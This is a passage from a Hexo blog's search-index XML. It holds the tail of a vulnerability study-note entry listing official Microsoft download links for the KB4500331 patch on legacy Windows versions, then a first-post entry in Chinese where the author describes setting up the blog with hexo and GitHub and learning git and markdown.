rel="noopener">http://download.windowsupdate.com/d/csa/csa/secu/2019/04/windowsserver2003-kb4500331-x64-custom-enu_e2fd240c402134839cfa22227b11a5ec80ddafcf.exe</a><br>Windows XP SP3 for XPe<br>    <a href="http://download.windowsupdate.com/d/csa/csa/secu/2019/04/windowsxp-kb4500331-x86-embedded-custom-chs_96da48aaa9d9bcfe6cd820f239db2fe96500bfae.exe" target="_blank" rel="noopener">http://download.windowsupdate.com/d/csa/csa/secu/2019/04/windowsxp-kb4500331-x86-embedded-custom-chs_96da48aaa9d9bcfe6cd820f239db2fe96500bfae.exe</a><br>WES09 and   POSReady 2009<br>    <a href="http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/04/windowsxp-kb4500331-x86-embedded-chs_e3fceca22313ca5cdda811f49a606a6632b51c1c.exe" target="_blank" rel="noopener">http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/04/windowsxp-kb4500331-x86-embedded-chs_e3fceca22313ca5cdda811f49a606a6632b51c1c.exe</a></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>我的第一个blog</title>
    <url>/2019/09/30/FistBlog/</url>
    <content><![CDATA[<img src="/2019/09/30/FistBlog/FirstBlog.jpeg">


<p>有幸终于搭建了自己的技术博客，这样提上日程的事情，竟是迟到了许久。</p>
<p>以往的笔记，或者感想都是记录在本地记事本里的，而自己的随笔，思想是附着在我的日记本上的（手写），现在它们有了新家。</p>
<p>与以往不同，它再不是简单的注册一个账号，亦或者发表一些评论。即便是有参考前辈们的教程，在搭建过程中也难免意外频出。</p>
<a id="more"></a>
<p>博客基于hexo+github搭建，这也是我所了解到最多人的选择，不用自己的服务器，网上有详细到每一个步骤的教程。这样一个方式，对于我一个新手，最合适不过。事实上，照葫芦画瓢是人人能做的，那我有无收获呢？有的。以前没有接触过git，markdown，搭建的时候只能一笔一划打上去，不知缘由，之后markdown写文章时，也只能参照模板修改文字。于是乎，我用了一天了解git，记下并使用了基本git语法，又用了半天了解markdown，总结语法。</p>
<p>在我的blog中，我会将之前学习总结的内容逐渐上传，之后的也不在只保存在本地，也都会上传至我的blog，此外还会表达一些自己的看法，以及上传平时写的小文。在一些技术文章中，可能有不对的地方，或有不足可以改进。若有前辈指出，则当虚心接受。</p>
<p>如有联系可私信我的知乎</p>
<p>我的知乎：<a href="https://www.zhihu.com/people/he-he-65-88-25/activities" target="_blank" rel="noopener">GgBooM</a></p>
<p>我的Github：<a href="https://github.com/GgBoom-993">GgBoom-993</a></p>
<p>此外，您还可以在导航栏发现我的所有文章以及我的其他社交联系方式，GgBoom敬上。</p>
]]></content>
      <categories>
        <category>浮生六记</category>
      </categories>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
</search>
